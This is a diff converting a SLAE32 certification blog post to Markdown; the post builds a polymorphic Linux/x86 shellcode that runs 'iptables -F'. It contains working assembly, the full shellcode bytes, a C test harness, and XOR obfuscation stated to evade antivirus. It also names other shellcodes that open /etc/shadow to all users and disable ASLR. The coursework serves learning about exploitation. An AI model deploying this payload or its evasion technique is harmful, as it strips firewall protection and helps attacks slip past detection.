@@ -1,20 +1,54 @@
 Title: SLAE32 - Assignment 6.3
 Date: 2022-06-04T14:31:50.000Z
 
-<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: PA-30398</p><h2 id="foreword">Foreword</h2><p>For this assignment, I chose the following shellcodes:</p><!--kg-card-begin: markdown--><ol>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-812.php">Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes</a></li>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-222.php">Linux/x86 - setuid(0) setgid(0) execve(echo 0 &gt; /proc/sys/kernel/randomize_va_space) - 79 bytes</a></li>
-<li><a href="http://shell-storm.org/shellcode/files/shellcode-825.php">Linux/x86 - iptables --flush - 43 bytes</a></li>
-</ol>
-<!--kg-card-end: markdown--><p>In this part I'll create a polymorphic version of the 3rd shellcode.</p><h2 id="source-code">Source Code</h2><p>The files for this part of the assignment are the following:</p><!--kg-card-begin: markdown--><ul>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm">original_shellcode.nasm</a>, the original shellcode taken from Shell-Storm</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm">polymorphic_shellcode.nasm</a>, my polymorphic version of the shellcode above</li>
-<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm">test_polymorphic_shellcode.nasm</a>, a <code>C</code> program for testing the polymorphic shellcode</li>
-</ul>
-<!--kg-card-end: markdown--><h2 id="analysis">Analysis</h2><p>First, we need to analyze the original shellcode:</p><pre><code class="language-bash">echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" &gt; shellcode.bin
+
+## Disclaimer
+
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:
+
+https://www.pentesteracademy.com/course?id=3
+
+Student ID: PA-30398
+
+## Foreword
+
+For this assignment, I chose the following shellcodes:
+
+<ol>
+- [Linux/x86 - chmod 666 /etc/passwd &amp; /etc/shadow - 57 bytes](http://shell-storm.org/shellcode/files/shellcode-812.php)
+
+- [Linux/x86 - setuid(0) setgid(0) execve(echo 0 > /proc/sys/kernel/randomize_va_space) - 79 bytes](http://shell-storm.org/shellcode/files/shellcode-222.php)
+
+- [Linux/x86 - iptables --flush - 43 bytes](http://shell-storm.org/shellcode/files/shellcode-825.php)
+
+In this part I'll create a polymorphic version of the 3rd shellcode.
+
+## Source Code
+
+The files for this part of the assignment are the following:
+
+- [original_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/original_shellcode.nasm), the original shellcode taken from Shell-Storm
+
+- [polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/polymorphic_shellcode.nasm), my polymorphic version of the shellcode above
+
+- [test_polymorphic_shellcode.nasm](https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/6/part/3/test_polymorphic_shellcode.nasm), a `C` program for testing the polymorphic shellcode
+
+## Analysis
+
+First, we need to analyze the original shellcode:
+
+```bash
+echo -ne "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" > shellcode.bin
 
 ndisasm -b 32 -p intel shellcode.bin
-</code></pre><p>Follows the output of <code>ndisasm</code>:</p><pre><code class="language-nasm">                            ; clear EAX, setting it to 0x00000000
+
+```
+
+Follows the output of `ndisasm`:
+
+```nasm
+                            ; clear EAX, setting it to 0x00000000
 00000000  31C0              xor eax,eax
 
                             ; null terminator for the string below
@@ -39,13 +73,21 @@ ndisasm -b 32 -p intel shellcode.bin
 0000001E  89E3              mov ebx,esp
 
                             ; array of pointers to command-line arguments:
-                            ;   - ebx -&gt; pointer to string '///sbin/iptables'
-                            ;   - esi -&gt; pointer to string '-F'
-                            ;   - eax -&gt; 0x00000000 (null terminator of the array)
+                            ;   - ebx -> pointer to string '///sbin/iptables'
+                            ;   - esi -> pointer to string '-F'
+                            ;   - eax -> 0x00000000 (null terminator of the array)
 00000020  50                push eax
 00000021  56                push esi
 00000022  53                push ebx
-</code></pre><p>So far, the author of this shellcode pushed the string <code>///sbin/iptables</code> to the stack, saving its pointer into the register <code>EBX</code>, which is going be used by <code>execve</code> as the <strong>1st argument</strong> of <code>iptables</code>.</p><p>Follows the function prototype of <code>execve</code>:</p><pre><code class="language-cpp">int execve(
+
+```
+
+So far, the author of this shellcode pushed the string `///sbin/iptables` to the stack, saving its pointer into the register `EBX`, which is going be used by `execve` as the **1st argument** of `iptables`.
+
+Follows the function prototype of `execve`:
+
+```cpp
+int execve(
   // executable to run
   const char *pathname,
 
@@ -55,10 +97,26 @@ ndisasm -b 32 -p intel shellcode.bin
   // array of environment variables
   char *const envp[]
 );
-</code></pre><p>In this case <code>EBX</code> is <code>pathname</code>, i.e. a pointer to a string indicating the executable to run.</p><p>While <code>ECX</code> is a pointer to an array of pointers, terminated by the <code>DWORD</code> <code>0x00000000</code>.</p><p>On the stack, it would look like this:</p><pre><code class="language-nasm">; *ebx -&gt; '///sbin/iptables'
-; *esi -&gt; '-F'
+
+```
+
+In this case `EBX` is `pathname`, i.e. a pointer to a string indicating the executable to run.
+
+While `ECX` is a pointer to an array of pointers, terminated by the `DWORD` `0x00000000`.
+
+On the stack, it would look like this:
+
+```nasm
+; *ebx -> '///sbin/iptables'
+; *esi -> '-F'
 ; 0x00000000
-</code></pre><p>Follows the rest of the disassembly:</p><pre><code class="language-nasm">                            ; 2nd argument of execve:
+
+```
+
+Follows the rest of the disassembly:
+
+```nasm
+                            ; 2nd argument of execve:
                             ;   pointer to array of pointers to strings acting as
                             ;   command-line arguments of the program
 00000023  89E1              mov ecx,esp
@@ -70,7 +128,17 @@ ndisasm -b 32 -p intel shellcode.bin
                             ; call execve syscall
 00000027  B00B              mov al,0xb
 00000029  CD80              int 0x80
-</code></pre><p>These instructions employ <code>execve</code> to run the command <code>///sbin/iptables -F</code>.</p><h2 id="polymorphic-shellcode">Polymorphic Shellcode</h2><p>Follows the polymorphic version of the shellcode:</p><pre><code class="language-nasm">; Title: Linux/x86 - iptables --flush
+
+```
+
+These instructions employ `execve` to run the command `///sbin/iptables -F`.
+
+## Polymorphic Shellcode
+
+Follows the polymorphic version of the shellcode:
+
+```nasm
+; Title: Linux/x86 - iptables --flush
 ; Author: Robert C. Raducioiu
 ; Web: rbct.it
 ; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php
@@ -137,7 +205,13 @@ _start:
 
     ; call execve
     int 0x80
-</code></pre><p>Now let me describe the changes. First, I've changed the following instructions...</p><pre><code class="language-nasm">global _start
+
+```
+
+Now let me describe the changes. First, I've changed the following instructions...
+
+```nasm
+global _start
 
 section .text
 
@@ -148,7 +222,13 @@ _start:
     push word 0x462d
     mov esi,esp
     push eax
-</code></pre><p>...into this:</p><pre><code class="language-nasm">global _start
+
+```
+
+...into this:
+
+```nasm
+global _start
 
 section .text
 
@@ -165,12 +245,36 @@ _start:
     ; instead of pushing the WORD 0x462d, use two steps
     mov di, 0x462d
     push di
-</code></pre><p>Starting from the beginning, instead of clearing only the register <code>EAX</code>, I'm also clearing <code>EBX</code> and <code>EDX</code>.</p><p>Moreover, instead of using the instruction <code>push eax</code>, I'm using <code>push edx</code> in order to change the bytes of the instruction.</p><p>Next, instead of using the instruction <code>push 0x462d</code> I chose a two-steps approach, at the cost of adding more bytes to the shellcode.</p><p>In particular, I chose to use the <code>MOV</code> instruction to copy the <code>WORD</code> value <code>0x462d</code> into the 16-bits <code>DI</code> register, and then push it to the stack.</p><p>After that:</p><pre><code class="language-nasm">    ; use edi instead of esi
+
+```
+
+Starting from the beginning, instead of clearing only the register `EAX`, I'm also clearing `EBX` and `EDX`.
+
+Moreover, instead of using the instruction `push eax`, I'm using `push edx` in order to change the bytes of the instruction.
+
+Next, instead of using the instruction `push 0x462d` I chose a two-steps approach, at the cost of adding more bytes to the shellcode.
+
+In particular, I chose to use the `MOV` instruction to copy the `WORD` value `0x462d` into the 16-bits `DI` register, and then push it to the stack.
+
+After that:
+
+```nasm
+    ; use edi instead of esi
     mov edi, esp
   
     ; use EBX or EDX instead of EAX
     push edx
-</code></pre><p>Instead of saving the pointer to the string <code>-F</code> into the register <code>ESI</code>, I'm using the register <code>EDI</code>, thus changing the bytes of the shellcode.</p><p>Next, I chose to use the instruction <code>push edx</code> instead of <code>push eax</code>, as both these registers are cleared, thus set to <code>0x00000000</code>.</p><p>Follows the next piece of assembly code to analyze:</p><pre><code class="language-nasm">    ; XOR key ('rbct')
+
+```
+
+Instead of saving the pointer to the string `-F` into the register `ESI`, I'm using the register `EDI`, thus changing the bytes of the shellcode.
+
+Next, I chose to use the instruction `push edx` instead of `push eax`, as both these registers are cleared, thus set to `0x00000000`.
+
+Follows the next piece of assembly code to analyze:
+
+```nasm
+    ; XOR key ('rbct')
     mov esi, 0x72626374
 
     ; NULL DWORD acting as the string terminator for
@@ -186,7 +290,26 @@ _start:
 
     push 0x014d4c5b
     xor [esp], esi
-</code></pre><p>This one differs the most in my opinion, and it's also the reason behind the increment of <code>11 bytes</code> compared to the original shellcode.</p><p>Given the path of the executable is pushed to the stack in clear-text, an <code>AntiVirus</code> program could easily find it, and therefore flag the shellcode as malicious.</p><p>Therefore, I decided to make a compromise and <code>XOR</code> two of the most obvious <code>DWORD</code> values:</p><ul><li><code>0x61747069</code> -&gt; <code>ipta</code></li><li><code>0x732f2f2f</code> -&gt; <code>///s</code></li></ul><p>One could also <code>XOR</code> the other two <code>DWORD</code> values, based on how many bytes you can add to the shellcode.</p><p>In this case, the <code>XOR</code> key is the <code>DWORD</code> value <code>0x72626374</code> (string: <code>rbct</code>).</p><p>Follows the second-to-last piece of Assembly code:</p><pre><code class="language-nasm">    ; save the pointer to the string into EBX
+
+```
+
+This one differs the most in my opinion, and it's also the reason behind the increment of `11 bytes` compared to the original shellcode.
+
+Given the path of the executable is pushed to the stack in clear-text, an `AntiVirus` program could easily find it, and therefore flag the shellcode as malicious.
+
+Therefore, I decided to make a compromise and `XOR` two of the most obvious `DWORD` values:
+
+- `0x61747069` -> `ipta`
+- `0x732f2f2f` -> `///s`
+
+One could also `XOR` the other two `DWORD` values, based on how many bytes you can add to the shellcode.
+
+In this case, the `XOR` key is the `DWORD` value `0x72626374` (string: `rbct`).
+
+Follows the second-to-last piece of Assembly code:
+
+```nasm
+    ; save the pointer to the string into EBX
     push esp
     pop ebx
 
@@ -195,7 +318,19 @@ _start:
 
     push edi
     push ebx
-</code></pre><p>Starting from the top, I used the <code>PUSH-POP</code> technique, instead of the instruction <code>mov ebx, esp</code>, as it changes the resulting bytes, while using the same number of bytes.</p><p>Next, I've repeated what I've already done before: use <code>push edx</code> instead of <code>push eax</code>, because they are both set to <code>0x00000000</code>.</p><p>The instructions <code>push edi</code> and <code>push ebx</code> aren't too different from the original shellcode, I had to use the register <code>edi</code> because I've changed it previously, storing the pointer to the string <code>-F</code> into <code>EDI</code> instead of <code>ESI</code>.</p><p>Finally, it's time to analyze the last piece of Assembly code:</p><pre><code class="language-nasm">    mov al, 0xa
+
+```
+
+Starting from the top, I used the `PUSH-POP` technique, instead of the instruction `mov ebx, esp`, as it changes the resulting bytes, while using the same number of bytes.
+
+Next, I've repeated what I've already done before: use `push edx` instead of `push eax`, because they are both set to `0x00000000`.
+
+The instructions `push edi` and `push ebx` aren't too different from the original shellcode, I had to use the register `edi` because I've changed it previously, storing the pointer to the string `-F` into `EDI` instead of `ESI`.
+
+Finally, it's time to analyze the last piece of Assembly code:
+
+```nasm
+    mov al, 0xa
     inc eax
 
     ; use the PUSH-POP technique instead 'mov ecx, esp'
@@ -204,8 +339,28 @@ _start:
 
     ; call execve
     int 0x80
-</code></pre><p>At the end of the original shellcode there's the instruction <code>mov al, 0xb</code>.</p><p>I chose to split it into two instructions (<code>mov al, 0xa</code> and <code>inc eax</code>), as it adds only one byte more compared to the original shellcode.</p><p>I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.</p><p>Next, I replaced the instruction <code>mov ecx,esp</code> with two instructions, using the <code>PUSH-POP</code> technique.</p><p>Compared to the original shellcode, I didn't have to clear the register <code>EDX</code>, as it was already cleared from the start (by means of <code>mul ebx</code>).</p><p>The last instruction is identical to the one from the original shellcode.</p><h3 id="testing">Testing</h3><p>To test the polymorphic shellcode, I've used the following C program:</p><pre><code class="language-cpp">#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
+
+```
+
+At the end of the original shellcode there's the instruction `mov al, 0xb`.
+
+I chose to split it into two instructions (`mov al, 0xa` and `inc eax`), as it adds only one byte more compared to the original shellcode.
+
+I also changed the position inside the shellcode: instead of placing the instructions at the end, I placed them before other instructions, in order to evade pattern matching.
+
+Next, I replaced the instruction `mov ecx,esp` with two instructions, using the `PUSH-POP` technique.
+
+Compared to the original shellcode, I didn't have to clear the register `EDX`, as it was already cleared from the start (by means of `mul ebx`).
+
+The last instruction is identical to the one from the original shellcode.
+
+### Testing
+
+To test the polymorphic shellcode, I've used the following C program:
+
+```cpp
+#include <stdio.h>
+#include <string.h>
 
 unsigned char code[] = \
 "\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80";
@@ -217,11 +372,29 @@ main()
     int (*ret)() = (int(*)())code;
     ret();
 }
-</code></pre><p>To compile:</p><pre><code class="language-bash">gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
-</code></pre><p>Once I've run it, I could confirm it executes <code>iptables -F</code> successfully:</p><pre><code class="language-bash">rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_shellcode 
+
+```
+
+To compile:
+
+```bash
+gcc -fno-stack-protector -z execstack -o test_polymorphic_shellcode test_polymorphic_shellcode.c
+
+```
+
+Once I've run it, I could confirm it executes `iptables -F` successfully:
+
+```bash
+rbct@slae:~/exam/assignment_6/3$ sudo strace -e trace=execve ./test_polymorphic_shellcode 
 # execve("./test_polymorphic_shellcode", ["./test_polymorphic_shellcode"], [/* 16 vars */]) = 0
 # Shellcode length: 58
 # execve("///sbin/iptables", ["///sbin/iptables", "-F"], [/* 0 vars */]) = 0
 
 rbct@slae:~/exam/assignment_6/3$
-</code></pre><p>As you can see, it confirms the length of the shellcode is <code>58 bytes</code>.</p><p>More important is the last <code>execve</code> syscall. It executed the command <code>///sbin/iptables -F</code> and returned <code>0</code>, meaning it succeeded.</p>
+
+```
+
+As you can see, it confirms the length of the shellcode is `58 bytes`.
+
+More important is the last `execve` syscall. It executed the command `///sbin/iptables -F` and returned `0`, meaning it succeeded.
+
